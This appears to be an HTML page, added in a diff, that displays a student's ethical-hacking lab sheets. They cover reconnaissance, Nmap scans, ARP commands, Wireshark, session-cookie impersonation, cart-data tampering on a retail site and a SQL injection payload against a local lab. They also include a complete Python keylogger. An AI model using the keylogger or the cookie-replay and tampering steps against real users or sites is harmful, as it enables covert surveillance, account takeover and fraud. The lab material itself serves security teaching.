@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ethical Hacking Practicals</title>
+<style>
+:root{color-scheme:dark;--bg:#292929;--panel:#333;--card:#414141;--line:#5a5a5a;--text:#f5f5f5;--muted:#bcbcbc}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font-family:Arial,Helvetica,sans-serif}
+.wrap{max-width:1200px;margin:38px auto;padding:0 22px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:24px;box-shadow:0 4px 14px #0004}
+h1{font-size:28px;margin:0 0 8px}
+.subtitle{color:var(--muted);margin:0 0 22px;line-height:1.5}
+.toolbar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:18px}
+input{flex:1;min-width:210px;background:#242424;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:12px;font-size:15px}
+button,.download{cursor:pointer;border:1px solid var(--line);background:#484848;color:white;border-radius:8px;padding:10px 14px;font-size:14px;text-decoration:none;display:inline-block}
+button:hover,.item:hover,.download:hover{background:#555}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px}
+.item{text-align:left;min-height:92px;padding:18px;background:var(--card);border:1px solid var(--line);border-radius:11px;box-shadow:0 3px 9px #0003;width:100%}
+.item strong{display:block;font-size:16px;margin-bottom:8px}
+.item span{font-size:13px;color:var(--muted);line-height:1.45}
+.viewer{display:none;margin-top:20px}
+.viewer-head{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:12px}
+.viewer h2{font-size:20px;margin:0}
+.codebox{border:1px solid var(--line);border-radius:10px;overflow:hidden;background:#171717}
+.code-meta{display:flex;justify-content:space-between;gap:12px;align-items:center;padding:10px 14px;background:#222;color:var(--muted);font-size:12px}
+pre{margin:0;padding:18px;overflow:auto;max-height:65vh;line-height:1.55;font-size:14px;tab-size:4;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,"Courier New",monospace}
+.empty{color:var(--muted);padding:16px 0;display:none}
+#docImage{max-width:100%;height:auto;border:1px solid var(--line);border-radius:8px}
+@media(max-width:600px){.wrap{margin:18px auto;padding:0 12px}.panel{padding:16px}h1{font-size:23px}.item{min-height:75px}}
+</style>
+</head>
+<body>
+<main class="wrap">
+<section class="panel">
+<h1>ETHICAL HACKING PRACTICALS</h1>
+<p class="subtitle">Only the latest Ethical Hacking files are included. Select a practical to view its content and copy text instructions.</p>
+<div class="toolbar"><input id="search" type="search" placeholder="Search practicals..." aria-label="Search practicals"></div>
+<div id="list" class="grid"></div>
+<p id="empty" class="empty">No practicals match your search.</p>
+<section id="viewer" class="viewer">
+<div class="viewer-head">
+<h2 id="codeTitle">Practical</h2>
+<div class="toolbar" style="margin:0">
+<button id="backBtn">← All practicals</button>
+<button id="copyBtn">Copy Text</button>
+<a id="downloadBtn" class="download" style="display:none" download>Download DOCX</a>
+</div>
+</div>
+<div id="docImageWrap" style="display:none;margin-bottom:14px"><img id="docImage" alt="Practical document page"></div>
+<div class="codebox">
+<div class="code-meta"><span id="fileName">filename</span><span id="lineCount"></span></div>
+<pre><code id="code"></code></pre>
+</div>
+</section>
+</section>
+</main>
+<script>
+const practicals = [{"file": "P1_Google_WHOIS_Reconnaissance.txt", "title": "P1 — Google and WHOIS Reconnaissance", "subject": "Ethical Hacking", "kind": "text", "code": "Step1: Open the WHO.is -website \nStep 2: Enter the website name and hit the “Enter button”. \nStep 3: Show you information about www.prestashop.com \nstep3- From that we can see an option options of\n       WHO.IS OPEN that and scroll down and we can \n       see an option for Raw Register Data open that\n       after that do same as we do for WHO.IS \n       THEN BESIDE OF WHO.IS there is an option \n       of WEBSITE INFO open that we can see an result \n       again same open beside of WEBSITE INFO there is \n       an option for HISTORY OPEN THAT and we can see an\n       result again same beside of history we can see an \n       option DNS RECORDS OPEN THAT and we can get result"}, {"file": "P3A_Network_Commands.txt", "title": "P3 (A) — Traceroute, Ping, IPConfig & Netstat", "subject": "Ethical Hacking", "kind": "text", "code": "Practical 3\nStep 1: Open Command prompt \nStep 2: Type tracert command and type www.prestashop.com press \"Enter\".\nType:\ntracert www.prestashop.com\nStep 3: ping all the IP addresses - ex. 91.240.109.42\nThis ip address we will notice after entering tracert  www.prestashop.com after running this command and that we can see ip address and we have to enter in that ping \nStep 4: \nType: ipconfig \nEnter this command\nStep 5: \nType: netstat"}, {"file": "P3B_ARP_Poisoning.txt", "title": "P3 (B) — ARP Poisoning in Windows", "subject": "Ethical Hacking", "kind": "text", "code": "Practical 3B\nStep1: Open Command prompt in Administrative mode \nHow to open administrative mode \nIn pc or laptop search type command prompt right click on that and we can see an option of Run administrative \nStep 2: Type arp \nStep 3: type arp -a\nStep 4: enter command ipconfig /all to get IP and MAC address \nEnter: ipconfig /all\nStep 5: Enter command arp -s followed by IP and MAC address \nEx. arp -s 157.55.85.212 00-aa-00-62-c6-09\nStep 6: Enter command arp -d\nEx. arp -d 192.168.0.101"}, {"file": "P4_Nmap_Port_Scanning.txt", "title": "P4 — Nmap Port Scanning (ACK, SYN, FIN, NULL, XMAS)", "subject": "Ethical Hacking", "kind": "text", "code": "Practical 4\nNOTE: Install Nmap Security Scanner for windows . After that open cmd and type “nmap” to check \nif it is installed properly. Install npcap for Windows. \n ACK -sA (TCP ACK scan) \nIt never determines open (or even open|filtered) ports. It is used to map out firewall rulesets, \ndetermining whether they are stateful or not and which ports are filtered. \nCommand: nmap -sA -T4 scanme.nmap.org \nEnter those commands step by step\n \n SYN (Stealth) Scan (-sS)\nSYN scan is the default and most popular scan option for good reason. It can be performed \nquickly, scanning thousands of ports per second on a fast network not hampered by intrusive \nfirewalls. \nCommand: nmap -p22,113,139 scanme.nmap.org  FIN Scan (-sF)\nSets just the TCP FIN bit. \nCommand: nmap -sF -T4 scanme.nmap.org \n NULL Scan (-sN) \nDoes not set any bits (TCP flag header is 0) \nCommand: nmap –sN –p 22 scanme.nmap.org  XMAS Scan (-sX)\nSets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. \nCommand: nmap -sX -T4 scanme.nmap.org"}, {"file": "P5_Wireshark_Traffic_Analysis.txt", "title": "P5 — Wireshark Network Traffic Analysis", "subject": "Ethical Hacking", "kind": "text", "code": "Practical 5\n\nStep 1: Install and open WireShark .\n\nStep 2: Go to Capture tab and select Interface option.\n\nStep 3: In Capture interface, Select Local Area Connection and click on start.\n\nStep 4: The source, Destination and protocols of the packets in the LAN network are displayed."}, {"file": "P6_Stored_XSS.docx", "title": "P6 — Persistent (Stored) Cross-Site Scripting", "subject": "Ethical Hacking", "kind": "document", "code": "Practical No. 6\nAim: Simulate persistent Cross Site Scripting attack.\n\nThe uploaded Word document contains a one-page practical sheet with screenshots of the Stored Cross Site Scripting (XSS) demonstration. The page image is shown below. Open the DOCX file from the code folder for the original document.", "image": "assets/P6_Stored_XSS_Page1.jpg", "download": "code/P6_Stored_XSS.docx"}, {"file": "P7_Session_Impersonation.txt", "title": "P7 — Session Impersonation & Tamper Data", "subject": "Ethical Hacking", "kind": "text", "code": "A] Session Impersonation \nSTEPS \n1. Open FireFox \n2. Go to Tools > Addons > Extension \n3. Search and install EditThisCookie or Cookie Import/Export or any other Cookie tool \n4. Then Click on Cookie extension to get cookie \n5. Open a Website and Login and then click on export cookie \n\nLogout from the webpage once the cookie got exported\n\n\n Paste the cookie in the tool which you have exported and click on green tick \n\nAnd you are in \n\nTamper DATA add-on \n1. Open FireFox \n2. Go to Tools > Addons > Extension \n3. Search and install Temper Data \n\nSelect a website for tempering data e.g(razorba) \nSelect any item to but \nThen Click to add cart \nThen Click on tool for tempering Data \n\n\nThen Start tempering the data \nHere you go"}, {"file": "P8_SQL_Injection.txt", "title": "P8 — SQL Injection", "subject": "Ethical Hacking", "kind": "text", "code": "Step 1 : Open XAMPP and start apache and mysql. \n\nStep 2 : Go to web browser and enter site . \n\nStep 3 : Create database with name sql_db.\n\n Step 4 : Go to site localhost/sql_injection/setup.php and click on create/reset database. \n\nStep 5 : Go to login.php and login using admin and . \n\nStep 6 : Opens the home page. \n\nStep 7 : Go to security setting option in left and set security level low. \n\nStep 8 : Click on SQL injection option in left. Step\n\n 9 : Write \"1\" in text box and click on submit. \n\n\nStep 10 : Write \"a' or ''='\" in text box and click on submit.\n\n Step 11 : Write \"1=1\" in text box and click on submit. \n\nStep 12 : Write \"1*\" in text box and click on submit."}, {"file": "P9_Python_Keylogger.txt", "title": "P9 — Python Keylogger", "subject": "Ethical Hacking", "kind": "text", "code": "Practical 9\nDownload some python module pynput \n py –m pip install pynput \nFollowing is the code to create a keylogger in python \nCode: - \nfrom pynput.keyboard import Key, Listener \nimport logging \n# if no name it gets into an empty string \nlog_dir = \"\" \n# This is a basic logging function \nlogging.basicConfig(filename=(log_dir+\"key_log.txt\"), level=logging.DEBUG, \nformat='%(asctime)s:%(message)s:') \n# This is from the library \ndef on_press(key): \n logging.info(str(key)) \n# This says, listener is on \nwith Listener(on_press=on_press) as listener: \n listener.join()"}, {"file": "P10_Metasploit.txt", "title": "P10 — Metasploit", "subject": "Ethical Hacking", "kind": "text", "code": "Practical 10\nMetasploit is one of the most powerful exploit tools. Most of its resources can be found at: \nhttps://www.metasploit.com. \nAs an Ethical Hacker, you will be using Kali Distribution which has the Metasploit community version \nembedded in it along with other ethical hacking tools. But if you want to install Metasploit as a separate \ntool, you can easily do so on systems that run on Linux, Windows, or Mac OS X.\nSteps: \nDownload and open metasploit \nUse exploit to attack the host \nCreate the exploit and add the exploit to the victim’s PC"}];
+const list=document.getElementById('list'), search=document.getElementById('search'), viewer=document.getElementById('viewer'), codeEl=document.getElementById('code');
+let active=null;
+function renderList(){
+ const q=search.value.trim().toLowerCase();
+ const filtered=practicals.filter(p=>(p.file+' '+p.title+' '+p.subject).toLowerCase().includes(q));
+ list.innerHTML=''; document.getElementById('empty').style.display=filtered.length?'none':'block';
+ filtered.forEach(p=>{
+  const b=document.createElement('button'); b.className='item';
+  const strong=document.createElement('strong'); strong.textContent=p.file;
+  const span=document.createElement('span'); span.textContent=p.subject+' · '+p.title;
+  b.append(strong,span); b.addEventListener('click',()=>showCode(p)); list.appendChild(b);
+ });
+}
+function showCode(p){
+ active=p; document.getElementById('codeTitle').textContent=p.title;
+ document.getElementById('fileName').textContent=p.file; codeEl.textContent=p.code;
+ document.getElementById('lineCount').textContent=p.code.split('\n').length+' lines';
+ const wrap=document.getElementById('docImageWrap'), img=document.getElementById('docImage');
+ const dl=document.getElementById('downloadBtn');
+ if(p.image){img.src=p.image;wrap.style.display='block';}else{img.removeAttribute('src');wrap.style.display='none';}
+ if(p.download){dl.href=p.download;dl.style.display='inline-block';}else{dl.removeAttribute('href');dl.style.display='none';}
+ document.getElementById('copyBtn').textContent='Copy Text';
+ viewer.style.display='block';list.style.display='none';search.parentElement.style.display='none';
+ document.getElementById('empty').style.display='none';viewer.scrollIntoView({behavior:'smooth',block:'start'});
+}
+function showList(){viewer.style.display='none';list.style.display='grid';search.parentElement.style.display='flex';renderList();}
+search.addEventListener('input',renderList);document.getElementById('backBtn').addEventListener('click',showList);
+document.getElementById('copyBtn').addEventListener('click',async()=>{
+ if(!active)return; const btn=document.getElementById('copyBtn');
+ try{await navigator.clipboard.writeText(active.code);btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy Text',1300);}
+ catch(e){btn.textContent='Clipboard unavailable';}
+});
+renderList();
+</script>
+</body>
+</html>
